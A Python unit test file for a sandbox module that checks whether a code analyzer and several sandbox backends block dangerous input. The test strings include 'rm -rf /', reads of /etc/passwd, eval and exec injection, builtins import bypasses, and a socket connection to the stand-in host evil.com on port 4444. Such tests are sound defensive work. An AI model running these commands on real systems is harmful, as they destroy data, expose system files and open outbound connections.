"""
Unit tests for sandbox_v2 module.

Tests security features of all sandbox implementations:
- BasicSandbox
- DockerSandbox
- GVisorSandbox
- WASMSandbox
- FirecrackerSandbox
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from legacy.sandbox_v2 import (
    BasicSandbox,
    CodeAnalyzer,
    DockerSandbox,
    FirecrackerSandbox,
    ResourceMonitor,
    SandboxConfig,
    SandboxLevel,
    SecureSandbox,
    WASMSandbox,
)


def _docker_available():
    """Check if Docker is available."""
    try:
        import docker

        client = docker.from_env()
        client.ping()
        return True
    except Exception:
        return False


def _wasm_available():
    """Check if WASM runtime is available."""
    try:
        return True
    except Exception:
        return False


def _memory_limit_supported():
    """Check if memory limit is supported on this platform."""
    import platform

    return platform.system() != "Windows"


class TestCodeAnalyzer(unittest.TestCase):
    """Test static code analysis."""

    def test_safe_code(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
import math
result = sum(math.sqrt(i) for i in range(100))
print(result)
""")
        self.assertTrue(is_safe)
        self.assertEqual(len(warnings), 0)

    def test_dangerous_import_os(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
import os
os.system('rm -rf /')
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("os" in w for w in warnings))

    def test_dangerous_import_subprocess(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
import subprocess
subprocess.run(['ls'])
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("subprocess" in w for w in warnings))

    def test_dangerous_eval(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
result = eval('__import__("os").system("ls")')
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("eval" in w for w in warnings))

    def test_dangerous_exec(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
exec('import os')
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("exec" in w for w in warnings))

    def test_dangerous_open(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
with open('/etc/passwd', 'r') as f:
    data = f.read()
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("open" in w for w in warnings))

    def test_syntax_error(self):
        is_safe, warnings = CodeAnalyzer.analyze("""
this is not valid python
""")
        self.assertFalse(is_safe)
        self.assertTrue(any("Syntax" in w for w in warnings))

    def test_safe_modules(self):
        safe_modules = ["math", "random", "statistics", "json", "re", "datetime"]
        for module in safe_modules:
            is_safe, warnings = CodeAnalyzer.analyze(f"""
import {module}
result = 0
""")
            self.assertTrue(is_safe, f"Module {module} should be safe")


class TestBasicSandbox(unittest.TestCase):
    """Test basic sandbox implementation."""

    def setUp(self):
        self.sandbox = BasicSandbox()

    def test_simple_calculation(self):
        result = self.sandbox.execute("""
result = sum(range(10))
""")
        self.assertTrue(result.success)
        self.assertEqual(result.result, 45)

    def test_math_operations(self):
        result = self.sandbox.execute("""
import math
result = math.sqrt(16)
""")
        self.assertTrue(result.success)
        self.assertEqual(result.result, 4.0)

    def test_print_output(self):
        result = self.sandbox.execute("""
print("Hello, World!")
""")
        self.assertTrue(result.success)
        self.assertIn("Hello, World!", result.output)

    def test_timeout(self):
        self.sandbox.config.timeout = 1
        result = self.sandbox.execute("""
import time
time.sleep(10)
""")
        self.assertFalse(result.success)

    def test_memory_limit(self):
        self.sandbox.config.memory_limit_mb = 10
        result = self.sandbox.execute("""
x = [0] * (100 * 1024 * 1024)
""")
        self.assertFalse(result.success)

    def test_dangerous_code_blocked(self):
        result = self.sandbox.execute("""
import os
os.system('echo test')
""")
        self.assertFalse(result.success)
        self.assertIn("Security check failed", result.error)


class TestDockerSandbox(unittest.TestCase):
    """Test Docker sandbox implementation."""

    def setUp(self):
        self.config = SandboxConfig(timeout=30, memory_limit_mb=256)
        self.sandbox = DockerSandbox(self.config)

    @unittest.skipUnless(_docker_available(), "Docker not available")
    def test_simple_execution(self):
        result = self.sandbox.execute("""
print("Hello from Docker!")
""")
        self.assertTrue(result.success)
        self.assertIn("Hello from Docker!", result.output)

    @unittest.skipUnless(_docker_available(), "Docker not available")
    def test_resource_limits(self):
        result = self.sandbox.execute("""
import sys
print(f"Memory limit: {sys.getsizeof([])}")
""")
        self.assertTrue(result.success)


class TestWASMSandbox(unittest.TestCase):
    """Test WebAssembly sandbox implementation."""

    def setUp(self):
        self.sandbox = WASMSandbox()

    def test_simple_execution(self):
        result = self.sandbox.execute("""
result = 2 + 2
print(f"Result: {result}")
""")
        self.assertTrue(result.success)
        self.assertIn("Result: 4", result.output)

    def test_is_available(self):
        available = self.sandbox.is_available()
        self.assertIsInstance(available, bool)


class TestFirecrackerSandbox(unittest.TestCase):
    """Test Firecracker MicroVM sandbox implementation."""

    def setUp(self):
        self.sandbox = FirecrackerSandbox()

    def test_fallback_execution(self):
        result = self.sandbox.execute("""
result = 3 * 3
""")
        self.assertTrue(result.success)

    def test_is_available(self):
        available = self.sandbox.is_available()
        self.assertIsInstance(available, bool)


class TestSecureSandbox(unittest.TestCase):
    """Test unified sandbox interface."""

    def test_basic_level(self):
        sandbox = SecureSandbox(level=SandboxLevel.BASIC)
        result = sandbox.execute("print('test')")
        self.assertTrue(result.success)

    def test_auto_select(self):
        sandbox = SecureSandbox.auto_select()
        self.assertIn(
            sandbox.level,
            [
                SandboxLevel.BASIC,
                SandboxLevel.CONTAINER,
                SandboxLevel.GVISOR,
                SandboxLevel.MICROVM,
                SandboxLevel.WASM,
            ],
        )

    def test_invalid_level(self):
        with self.assertRaises(ValueError):
            SecureSandbox(level="invalid")


class TestResourceMonitor(unittest.TestCase):
    """Test resource monitoring."""

    def test_basic_monitoring(self):
        monitor = ResourceMonitor()
        monitor.start()

        sum(range(1000000))

        usage = monitor.stop()

        self.assertIn("execution_time", usage)
        self.assertGreater(usage["execution_time"], 0)
        self.assertIn("memory_peak_mb", usage)

    def test_memory_tracking(self):
        monitor = ResourceMonitor()
        monitor.start()

        usage = monitor.stop()

        self.assertGreaterEqual(usage["memory_used_mb"], 0)


class TestSecurityScenarios(unittest.TestCase):
    """Test various security attack scenarios."""

    def setUp(self):
        self.sandbox = SecureSandbox.auto_select()

    def test_code_injection_via_eval(self):
        result = self.sandbox.execute("""
__import__('os').system('echo INJECTED')
""")
        self.assertFalse(result.success)

    def test_code_injection_via_exec(self):
        result = self.sandbox.execute("""
exec("import os\\nos.system('id')")
""")
        self.assertFalse(result.success)

    def test_file_read_attempt(self):
        result = self.sandbox.execute("""
with open('/etc/passwd', 'r') as f:
    data = f.read()
""")
        self.assertFalse(result.success)

    def test_subprocess_injection(self):
        result = self.sandbox.execute("""
import subprocess
subprocess.run(['ls', '-la'])
""")
        self.assertFalse(result.success)

    def test_socket_connection(self):
        result = self.sandbox.execute("""
import socket
s = socket.socket()
s.connect(('evil.com', 4444))
""")
        self.assertFalse(result.success)

    def test_import_bypass_attempt(self):
        result = self.sandbox.execute("""
__builtins__['__import__']('os')
""")
        self.assertFalse(result.success)

    def test_attribute_access_bypass(self):
        result = self.sandbox.execute("""
getattr(__builtins__, '__import__')('os')
""")
        self.assertFalse(result.success)

    def test_infinite_loop_with_timeout(self):
        self.sandbox.config.timeout = 2
        result = self.sandbox.execute("""
while True:
    pass
""")
        self.assertFalse(result.success)

    def test_memory_exhaustion_attempt(self):
        self.sandbox.config.memory_limit_mb = 10
        result = self.sandbox.execute("""
x = 'A' * (1024 * 1024 * 100)
""")
        self.assertFalse(result.success)


if __name__ == "__main__":
    unittest.main(verbosity=2)
